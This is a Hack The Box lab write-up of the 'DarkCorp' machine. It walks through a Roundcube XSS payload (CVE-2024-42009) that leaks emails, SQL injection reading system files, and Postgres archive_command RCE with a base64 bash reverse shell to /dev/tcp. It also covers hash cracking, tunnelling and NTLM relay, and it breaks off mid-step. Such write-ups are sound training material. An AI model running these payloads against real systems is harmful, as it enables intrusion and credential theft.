---
title: DarkCorp
summary: Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SSH (22), HTTP (80), CVE-2024-42009.
date: 2026-09-04
tags: [Hack The Box, Active Directory, Windows]
difficulty: insane
os: Windows
url: https://app.hackthebox.com/machines/DarkCorp
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/DarkCorp%20-%20Insane%20AD/DarkCorp%20%5BAD%5D%20%5BInsane%5D.md
---

# DarkCorp
## Enumeration
### Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.129.232.7
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 17:07 +0100
Nmap scan report for 10.129.232.7
Host is up (0.014s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 66.20 seconds
```

### Nmap
```python
nmap -p 22,80 -A --min-rate=2000 -sT 10.129.232.7    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 17:09 +0100
Nmap scan report for 10.129.232.7
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.22.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## SSH (22)
### Auth method
```python
ssh root@10.129.232.7                                     
The authenticity of host '10.129.232.7 (10.129.232.7)' can't be established.
ED25519 key fingerprint is: SHA256:JNw/rUlpDzlUEzvKKKFQ/M4prRH35ZhHammHWv47SkY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.232.7' (ED25519) to the list of known hosts.
root@10.129.232.7's password:
```

Password based auth

## HTTP (80)

The website points at the domain `drip.htb`

![Screenshot](images/darkcorp/pasted-image-20260904171628.webp)

The sign in link takes me to `mail.drip.htb`

![Screenshot](images/darkcorp/pasted-image-20260904172715.webp)



![Screenshot](images/darkcorp/pasted-image-20260904172910.webp)

There is also a register function on the page

Just as i thought registering an accout allows me to logon to the dripmail instance

![Screenshot](images/darkcorp/pasted-image-20260904173332.webp)

I am now logged in 

![Screenshot](images/darkcorp/pasted-image-20260904173358.webp)

Found the version info 

![Screenshot](images/darkcorp/pasted-image-20260904173820.webp)

Also found a potential user

This version of several different CVEs

## CVE-2024-42009

https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/

https://medium.com/@zaid.zrf/practical-exploitation-of-cve-2024-42009-using-docker-and-swaks-124ac0bad911

https://algora.io/claims/28piVn5uYiQzf8b4

https://github.com/DaniTheHack3r/CVE-2024-42009-PoC?utm_source=chatgpt.com

I can use the contact form on the `http://drip.htb` page to send the email, interestingly if i proxy the request it lets me change the recipient, so ill create a victim account and begin trying the some payloads and testing them there

![Screenshot](images/darkcorp/pasted-image-20260904183549.webp)

```python
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(1) foo=bar">Foo</body>
```

Ive sent a simple alert payload, to the victim user and it mentions another user `bcase@drip.htb` 

https://github.com/Bhanunamikaze/CVE-2024-42009/blob/main/exploit.py

Ill try this POC script

```python
python3 exploit.py -fu ethan@drip.htb -tu bcase@drip.htb -u http://drip.htb/contact -ip 10.10.14.61 -p 80
[*] CVE-2024-42009 PoC: Listening on 10.10.14.61:80...


[+] Captured Email Content:
Hi bcase,
Welcome to DripMail! We're excited to provide you with convenient email solutions! If you need help, please reach out to us at
support@drip.htb
.

[+] Captured Email Content:
Hey Bryce,
The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.
If you encounter any issues or have feedback, let me know so I can address them promptly.
Thanks

[+] Captured Email Content:

^C
[!] Stopping...
```

As seen here it allows me to exfil the users emails. It gives me info on another subdomain

## `dev-a3f1-01` subdomain

![Screenshot](images/darkcorp/pasted-image-20260904184544.webp)

The leaked email tells me ill  have to reset my password before logging in!

![Screenshot](images/darkcorp/pasted-image-20260904184807.webp)

Ill use the forgot password feature and send an email to bcase which i can then leak that email once again

![Screenshot](images/darkcorp/pasted-image-20260904185010.webp)

Ive sent the reset request and using the POC i can dump the link

Using this link i can reset the password for `bcase`, ive changed the password to `password`

`bcase:password` gets me access to the dashboard

![Screenshot](images/darkcorp/pasted-image-20260904185431.webp)

There is an analytics dashboard which i can use to see the other users

![Screenshot](images/darkcorp/pasted-image-20260904185545.webp)

Using a `'` in the search function on the analytics endpoint i get a SQL error, this is likely vulnerable to SQL injection

This error tells me its using postgresql as a backend database

## SQL injection on analytics subdomain

```python
sqlmap -r request.txt --level=4 --risk=3 --flush-session --batch --dbs

...[SNIP]...

[19:08:49] [INFO] the back-end DBMS is PostgreSQL
web application technology: Nginx 1.22.1, WordPress
back-end DBMS: PostgreSQL
[19:08:50] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
[19:08:50] [INFO] fetching database (schema) names
[19:08:50] [INFO] fetching number of databases
[19:08:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[19:08:50] [INFO] retrieved: 3
[19:08:51] [INFO] retrieved: 
[19:08:51] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[19:08:51] [INFO] retrieved: 
[19:08:51] [INFO] retrieved: 
[19:08:52] [INFO] falling back to current database
[19:08:52] [INFO] fetching current database
[19:08:52] [INFO] retrieved: public
[19:08:55] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
available databases [1]:
[*] public
```

I have managed to the dump the database name, i can now dump its contents

```python
sqlmap -r request.txt --level=4 --risk=3 --flush-session --batch --dbs --dbms=postgresql -D public --schema

Database: public
Table: Users
[6 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| email       | varchar |
| host_header | varchar |
| id          | int4    |
| ip_address  | varchar |
| password    | varchar |
| username    | varchar |
+-------------+---------+

Database: public
Table: Admins
[4 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| email    | varchar |
| id       | int4    |
| password | varchar |
| username | varchar |
+----------+---------+
```

There are two tables in this DB

However i cannot dump the contents of either table

![Screenshot](images/darkcorp/pasted-image-20260907190228.webp)

I am able to get SQLi to work through stacked queries

![Screenshot](images/darkcorp/pasted-image-20260907190724.webp)

I can get the path of the config file, using this i should be able to get its output

```python
''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf', 0, 2000);
```

![Screenshot](images/darkcorp/pasted-image-20260907190933.webp)

I can get the contents of the file, however this is only the first part of the file, i will continue reading through this

Using this same query i should be able to access other files on the system too

```python
''; SELECT pg_read_file('/etc/passwd', 0, 2000);
```

![Screenshot](images/darkcorp/pasted-image-20260907191041.webp)

```python
''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf');
```

Using this query i can read the full config file

Having a read through the full output i see `archive_mode` is enabled, which should allow RCE

![Screenshot](images/darkcorp/pasted-image-20260907191835.webp)

As seen here it is on, if i can append a command to the `archive_command` parameter, it will execute it after the postgresql flushes its logs

## Reverse shell on linux server

https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3

So ill follow this article to try and get RCE

```python
''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf');
```

Rather getting the LOID of the file then using that to output it, ill just use this copy the contents to my machine and modify the command parameter

```python
echo 'bash -i &>/dev/tcp/10.10.14.61/1337 <&1' | base64
YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjYxLzEzMzcgPCYxCg==
```

Ill encode my command

```python
archive_command = 'echo "YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjYxLzEzMzcgPCYxCg==" | base64 -d | bash'
```

Then ill append it to the file

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Ill start a listener

Now the next step is to overwrite the current config with my malicious one

```python
cat postgesql.conf | base64 -w 0 | xclip -selection clipboard
```

Ill cat the malicious conf file then base64 encode its output and disable word wrap, then copy to clipboard

```python
SELECT lo_from_bytea(12345, decode('<base64 contents>', 'base64'))
```

![Screenshot](images/darkcorp/pasted-image-20260907195348.webp)

This has loaded the new contents into the LOID 12345 and base64 decoded it

```python
SELECT lo_export(12345, '/etc/postgresql/15/main/postgresql.conf')
```

![Screenshot](images/darkcorp/pasted-image-20260907195449.webp)

Now the file should be exported

```python
''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf');
```

![Screenshot](images/darkcorp/pasted-image-20260907200202.webp)

I can now re run my original command and see my config is there

```python
''; SELECT pg_reload_conf()
''; SELECT pg_switch_wal()
```

![Screenshot](images/darkcorp/pasted-image-20260907200555.webp)

I now have a shell on the system

## Privilege escalation

```python
postgres@drip:/var/www/html/dashboard$ cat .env
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
postgres@drip:/var/www/html/dashboard$ 
```

I have found a password, this is shown in a connection string for another DB user

![Screenshot](images/darkcorp/pasted-image-20260907203334.webp)

Running linpeas i found some interesting GPG files

```python
postgres@drip:/var/backups/postgres$ gpg --decrypt dev-dripmail.old.sql.gpg | tee /tmp/dev-dripmail.old.sql

...[SNIP]...

COPY public."Admins" (id, username, password, email) FROM stdin;
1	bcase	dc5484871bc95c4eab58032884be7225	bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb

COPY public."Users" (id, username, password, email, host_header, ip_address) FROM stdin;
5001	support	d9b9ecbf29db8054b21f303072b37c4e	support@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
5002	bcase	1eace53df87b9a15a37fdc11da2d298d	bcase@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
5003	ebelford	0cebd84e066fd988e89083879e88c5f9	ebelford@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
```

Ill load these into hashcat

```python
victor.r:cac1c7b0e7008d67b6db40c03e76b9c0:victor1gustavo@#
ebelford:8bbd7f88841b4223ae63c8848969be86:ThePlague61780
```

Two of the hashes cracked, however ebelford is the only user with a logon here

## Access as `ebelford`

```python
ssh ebelford@drip.htb
ebelford@drip.htb's password: 
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have no mail.
Last login: Mon Sep  7 13:45:42 2026 from 172.16.20.1
ebelford@drip:~$
```

I now have access as this user

```python
ebelford@drip:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:84:03:02 brd ff:ff:ff:ff:ff:ff
    inet 172.16.20.3/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
ebelford@drip:~$
```

Ill have a look at the internal network, since this machine is supposed to be a AD machine, so im assuming this is doman joined

There is also a keytab file, which i need to be root to read

```python
ebelford@drip:~$ ping 172.16.20.2   
PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
64 bytes from 172.16.20.2: icmp_seq=1 ttl=128 time=0.768 ms
64 bytes from 172.16.20.2: icmp_seq=2 ttl=128 time=0.764 ms
^C
--- 172.16.20.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1010ms
rtt min/avg/max/mdev = 0.764/0.766/0.768/0.002 ms
ebelford@drip:~$ ping 172.16.20.1
PING 172.16.20.1 (172.16.20.1) 56(84) bytes of data.
64 bytes from 172.16.20.1: icmp_seq=1 ttl=128 time=0.559 ms
64 bytes from 172.16.20.1: icmp_seq=2 ttl=128 time=0.508 ms
^C
--- 172.16.20.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1032ms
rtt min/avg/max/mdev = 0.508/0.533/0.559/0.025 ms
ebelford@drip:~$ 
```

I can ping two more hosts here

However is stops at `.4`

```python
ebelford@drip:~$ cat /etc/hosts
127.0.0.1	localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.3 drip.darkcorp.htb
ebelford@drip:~$
```

I can also check `/etc/hosts` and i see `.1` is the DC

Not sure what `.2` is as of yet

I will setup a proxy to access the internal network

## Setting up ligolo-ng to access internal network

So to start ill download the latest release of the linux agent and linux proxy

```python
sudo ./proxy -selfcert           
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0001] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.9.1

ligolo-ng »
```

Ill start the proxy on my machine

Ill use scp to transfer the agent to the target

```python
scp agent ebelford@drip.htb:/tmp/
```

This transferred it to the target

```python
ebelford@drip:/tmp$ chmod +x agent
ebelford@drip:/tmp$ ./agent -connect 10.10.14.61:11601 --ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.14.61:11601"
```

Ill then send the connection back

```python
ligolo-ng » session
? Specify a session : 1 - ebelford@drip - 10.129.232.7:58262 - 00155d840302
[Agent : ebelford@drip] » 
[Agent : ebelford@drip] » 
[Agent : ebelford@drip] » ifcreate --name ligolo
INFO[0115] Creating a new ligolo interface...           
INFO[0115] Interface created!                           
[Agent : ebelford@drip] » ifconfig
┌────────────────────────────────────┐
│ Interface 0                        │
├──────────────┬─────────────────────┤
│ Name         │ lo                  │
│ Hardware MAC │                     │
│ MTU          │ 65536               │
│ Flags        │ up|loopback|running │
│ IPv4 Address │ 127.0.0.1/8         │
└──────────────┴─────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ eth0                           │
│ Hardware MAC │ 00:15:5d:84:03:02              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.20.3/24                 │
└──────────────┴────────────────────────────────┘
[Agent : ebelford@drip] » route_add --name ligolo --route 172.16.20.0/24
INFO[0194] Route created.                               
[Agent : ebelford@drip] » tunnel_start 
INFO[0205] Starting tunnel to ebelford@drip (00155d840302) 
[Agent : ebelford@drip] »  
```

Then ill attach to the session make the new interface and add the routing info, then finally start the tunnel

```python
ping 172.16.20.2
PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=49.3 ms
64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=43.3 ms
64 bytes from 172.16.20.2: icmp_seq=3 ttl=64 time=48.2 ms
```

I can now ping the internal network

```python
nxc smb 172.16.20.0/24                                                       
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

I can now enumerate both of these hosts 

## Nmap on internal network

```python
nmap -p- -sT -Pn 172.16.20.1-2

Nmap scan report for dc-01.darkcorp.htb (172.16.20.1)
Host is up (0.028s latency).
Not shown: 65506 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
57237/tcp open  unknown
58099/tcp open  unknown
58304/tcp open  unknown
58315/tcp open  unknown
58347/tcp open  unknown
58351/tcp open  unknown

Nmap scan report for web-01 (172.16.20.2)
Host is up (0.019s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5000/tcp  open  upnp
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
```

So the webserver on the DC on port 80 is the web drip mail web service

The one running on 443 is just default IIS

The webserver on port 80 of the web-01 server is also default IIS

## Enumeration on internal hosts

```python
┌──❰kali@kali❱──❰192.168.86.128❱──❰~/htb/darkcorp❱─────────────────────────────────────────────────── 18:11:54
└──╼ 󰽢 nxc smb dc-01.darkcorp.htb -u 'victor.r' -p '' -k
SMB         dc-01.darkcorp.htb 445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc-01.darkcorp.htb 445    DC-01            [-] darkcorp.htb\victor.r: KDC_ERR_PREAUTH_FAILED 
                                                                                                              

┌──❰kali@kali❱──❰192.168.86.128❱──❰~/htb/darkcorp❱─────────────────────────────────────────────────── 18:16:51
└──╼ 󰽢 nxc smb web-01.darkcorp.htb -u 'victor.r' -p '' -k
SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
SMB         web-01.darkcorp.htb 445    WEB-01           [-] darkcorp.htb\victor.r: KDC_ERR_PREAUTH_FAILED
```

The user i found earlier `victor.r` is valid on both hosts, however ebelford is not

## Initial access on internal network

```python
┌──❰kali@kali❱──❰192.168.86.128❱──❰~/htb/darkcorp❱─────────────────────────────────────────────────── 18:19:30
└──╼ 󰽢 nxc smb web-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' -k
SMB         web-01.darkcorp.htb 445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
SMB         web-01.darkcorp.htb 445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
                                                                                                              

┌──❰kali@kali❱──❰192.168.86.128❱──❰~/htb/darkcorp❱─────────────────────────────────────────────────── 18:19:37
└──╼ 󰽢 nxc smb dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' -k
SMB         dc-01.darkcorp.htb 445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc-01.darkcorp.htb 445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
```

The cracked password found earlier gets me initial access on both hosts

It does not get me access over SSH on the DC

### Shares

```python
nxc smb web-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --shares
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
SMB         172.16.20.2     445    WEB-01           [*] Enumerated shares
SMB         172.16.20.2     445    WEB-01           Share           Permissions     Remark
SMB         172.16.20.2     445    WEB-01           -----           -----------     ------
SMB         172.16.20.2     445    WEB-01           ADMIN$                          Remote Admin
SMB         172.16.20.2     445    WEB-01           C$                              Default share
SMB         172.16.20.2     445    WEB-01           IPC$            READ            Remote IPC
```

Read access on `IPC$` on the web-01 machine

```python
nxc smb dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --shares
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
SMB         172.16.20.1     445    DC-01            [*] Enumerated shares
SMB         172.16.20.1     445    DC-01            Share           Permissions     Remark
SMB         172.16.20.1     445    DC-01            -----           -----------     ------
SMB         172.16.20.1     445    DC-01            ADMIN$                          Remote Admin
SMB         172.16.20.1     445    DC-01            C$                              Default share
SMB         172.16.20.1     445    DC-01            CertEnroll      READ            Active Directory Certificate Services share
SMB         172.16.20.1     445    DC-01            IPC$            READ            Remote IPC
SMB         172.16.20.1     445    DC-01            NETLOGON        READ            Logon server share 
SMB         172.16.20.1     445    DC-01            SYSVOL          READ            Logon server share
```

Read access on the `CertEnroll` share

### Users

```python
nxc smb dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC-01$
victor.r
svc_acc
john.w
angela.w
angela.w.adm
taylor.b
DRIP$
taylor.b.adm
```

Ill use --rid-brute to dump and create a user list

There are no kerberoastable users, and no asreproastable users

No writable objects as `victor.r`

Nothing in bloodhound

No password reuse

## Internal web service running on port 5000 (`web-01`)

![Screenshot](images/darkcorp/pasted-image-20260909193244.webp)

When browsing to it, i get prompted for a native logon, `victor.r` credentials work

![Screenshot](images/darkcorp/pasted-image-20260909202556.webp)

This page looks interesting

Ill use curl to play with this request, the response shows `negotiate` as the `www-authenticate` header, which means it accepts kerberos auth

```python
nxc smb dc-01.darkcorp.htb -u victor.r -p 'victor1gustavo@#' --generate-tgt victor
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
SMB         172.16.20.1     445    DC-01            [+] TGT saved to: victor.ccache
SMB         172.16.20.1     445    DC-01            [+] Run the following command to use the TGT: export KRB5CCNAME=victor.ccache

sudo nxc smb dc-01.darkcorp.htb -u victor.r -p 'victor1gustavo@#' --generate-krb5-file /etc/krb5.conf 
[sudo] password for kali: 
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC-01            [+] krb5 conf saved to: /etc/krb5.conf
SMB         172.16.20.1     445    DC-01            [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@#
```

Ill generate both

```python
export KRB5_CONFIG=/etc/krb5.conf
export KRB5CCNAME=victor.ccache
```

Then ill export them

```python
curl -X POST --negotiate -u ':' http://web-01.darkcorp.htb:5000/status -H 'Content-Type: application/json' -d '{"protocol":"http","host":"drip.darkcorp.htb","port":"80"}'  
{"message":"http://drip.darkcorp.htb:80 is up!","status":"Success!"}
```

I can now send the request and get a response back

When trying an IP address it fails, saying `Invalid Input` likely meaning you cant put an IP address there

Its also not possible to add a DNS record in this situation for my own machine using `victor.r` credentials

So i cannot capture the NTLM hash of the user using responder

## Adding malicious DNS record

```python
ebelford@drip:/tmp$ ./socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:10.10.14.61:80
```

Ill get a statically compiled socat binary on the SSH target, then set it to listen on port 8080 and forward traffic back to me on `10.10.14.61:80`, im doing this becuase i cannot get it to connect back to me directly, so ill get it to connect to the drip server then forward the auth to me using socat

```python
ntlmrelayx.py -t ldap://dc-01.darkcorp.htb -smb2support 
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client RPC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client WINRMS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

Since i cant use responder to grab the hash, ill use ntlm relay initially just to see what user account its authenticating as!

![Screenshot](images/darkcorp/pasted-image-20260910181353.webp)

Then ill send the request back to the drip server on port 8080 where socat is listening

```python
[*] Servers started, waiting for connections
[*] (HTTP): Client requested path: /
[*] (HTTP): Client requested path: /
[*] (HTTP): Client requested path: /
[*] (HTTP): Connection from 10.129.232.7 controlled, attacking target ldap://dc-01.darkcorp.htb
[*] (HTTP): Client requested path: /
[*] (HTTP): Authenticating connection from DARKCORP/SVC_ACC@10.129.232.7 against ldap://dc-01.darkcorp.htb SUCCEED [1]
[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Enumerating relayed user's privileges. This may take a while on large domains
[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Dumping domain info for first time
[*] ldap://DARKCORP/SVC_ACC@dc-01.darkcorp.htb [1] -> Domain info dumped into lootdir!
```

So the purpose of this was not to exploit anything as of yet, instead i just wanted to see the user account its running and authenticating as, i now know its `svc_acc`

![Screenshot](images/darkcorp/pasted-image-20260910181633.webp)

This user is part of the DNSADMINS group, this means i can add DNS records as this user, this is especially important in this situation since regular users cannot add DNS records in this environment

So the plan is to setup ntlmrelay once again and get it to use the authentication to add a DNS record pointing back at my IP, its still important i have socat running

```python
